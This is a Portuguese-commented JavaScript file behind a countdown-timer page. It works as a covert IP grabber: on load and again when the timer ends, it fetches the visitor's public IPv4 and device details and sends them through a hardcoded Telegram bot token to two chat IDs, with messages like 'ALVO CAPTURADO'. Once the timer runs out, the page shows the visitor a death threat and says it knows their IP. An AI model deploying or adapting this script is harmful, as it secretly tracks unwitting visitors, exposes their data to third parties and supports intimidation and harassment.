// ================================================
// script.js - Forçando IPv4 + Cooldown + Mensagens Diferentes
// ================================================

let targetDate = new Date("2026-04-25T23:59:59").getTime();
let timerInterval = null;

const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";

const CHAT_IDS = [
    "8448614204",   // Você
    "8219025301",   // Luizz
];

// Anti-spam (5 minutos por IP)
const processedIPs = new Map();
const COOLDOWN_TIME = 5 * 60 * 1000; // 5 minutos

function detectDeviceType() {
    const ua = navigator.userAgent.toLowerCase();
    if (/smart-tv|tv|crkey|roku|android tv|firetv/i.test(ua)) return "Smart TV";
    if (/playstation|xbox|nintendo|switch/i.test(ua)) return "Console de videogame";
    if (/ipad|tablet|playbook|silk/i.test(ua)) return "Tablet";
    if (/android|iphone|ipod|blackberry|iemobile|opera mini/i.test(ua)) return "Celular";
    return "Computador";
}

function getDeviceInfo() {
    const deviceType = detectDeviceType();
    const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "unknown";

    return {
        deviceType,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language || navigator.userLanguage,
        screen: `${window.screen.width} x ${window.screen.height}`,
        windowSize: `${window.innerWidth} x ${window.innerHeight}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: ram
    };
}

// ==================== PEGAR IPv4 FORÇADO ====================
async function getIPv4() {
    try {
        // api.ipify.org força IPv4 na maioria dos casos
        let res = await fetch('https://api.ipify.org?format=json');
        let data = await res.json();
        if (data.ip && !data.ip.includes(':')) return data.ip; // verifica se não é IPv6

        // Fallback seguro para IPv4
        res = await fetch('https://api4.my-ip.io/ip.json');
        data = await res.json();
        return data.ip || 'Não capturado';
    } catch (e) {
        console.error("Erro ao pegar IPv4:", e);
        return "Não capturado";
    }
}

// ==================== MENSAGEM DE ENTRADA ====================
async function sendEntryMessage(ip) {
    const device = getDeviceInfo();
    const message = `👀 ALGUÉM ENTROU NO SITE!\n\n` +
                    `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                    `🌐 IP (IPv4): ${ip}\n` +
                    `📱 Tipo: ${device.deviceType}\n` +
                    `• Sistema: ${device.platform}\n` +
                    `• Tela: ${device.screen}\n\n` +
                    `Alguém abriu a página... vamos ver se aguenta até o final 😈`;

    for (const chatId of CHAT_IDS) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });
        } catch (err) {}
    }
}

// ==================== MENSAGEM QUANDO TIMER ZERAR ====================
async function sendTimerZeroMessage(ip) {
    const now = Date.now();

    if (ip && processedIPs.has(ip)) {
        if (now - processedIPs.get(ip) < COOLDOWN_TIME) {
            console.log(`⏳ Cooldown ativo para IP: ${ip}`);
            return;
        }
    }

    if (ip) processedIPs.set(ip, now);

    const device = getDeviceInfo();

    const message = `🚨 ALVO CAPTURADO - TIMER ZERADO!\n\n` +
                    `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                    `🌐 IP (IPv4): ${ip}\n` +
                    `📱 Tipo: ${device.deviceType}\n` +
                    `• Sistema: ${device.platform}\n` +
                    `• Tela: ${device.screen}\n` +
                    `• RAM: ${device.deviceMemory}\n\n` +
                    `HAHAHAHAHA QUE LIXO KKKKK\n` +
                    `Esperou até o final...\n\n` +
                    `Não é magia, é habilidade isto...`;

    for (const chatId of CHAT_IDS) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });
        } catch (err) {}
    }
}

// ==================== CAPTURA AO ENTRAR ====================
async function captureIPOnLoad() {
    const ip = await getIPv4();
    await sendEntryMessage(ip);
    console.log("IPv4 capturado ao entrar:", ip);
}

// ==================== UPDATE TIMER ====================
function updateTimer() {
    const timeNow = new Date().getTime();
    let timeLeft = targetDate - timeNow;

    if (timeLeft < 0) {
        clearInterval(timerInterval);

        // Pega IPv4 novamente no momento que zera
        getIPv4().then(ip => {
            sendTimerZeroMessage(ip);
        });

        showFinalMessageOnScreen();
        return;
    }

    const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
    const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
    const centiseconds = Math.floor((timeLeft % 1000) / 10);

    document.getElementById("timer").innerHTML = `
        ${days}d ${hours}h ${minutes}m ${seconds}.${centiseconds.toString().padStart(2, '0')}s
    `;
}

function showFinalMessageOnScreen() {
    const deviceType = detectDeviceType();
    document.getElementById("timer").innerHTML = `
        Tempo esgotado!<br><br>
        Prepare-se para morrer, seu lixo...<br><br>
        Eu sei que você tá usando essa merda de ${deviceType.toLowerCase()}.<br>
        Eu sei o seu IP de merda.<br><br>
        Você é um fracassado patético.<br><br>
        Não é magia, é habilidade isto...
    `;
}

// ==================== INICIALIZAÇÃO ====================
async function init() {
    await captureIPOnLoad();   // Pega IPv4 + envia "Alguém entrou"
    timerInterval = setInterval(updateTimer, 100);
    updateTimer();
}

init();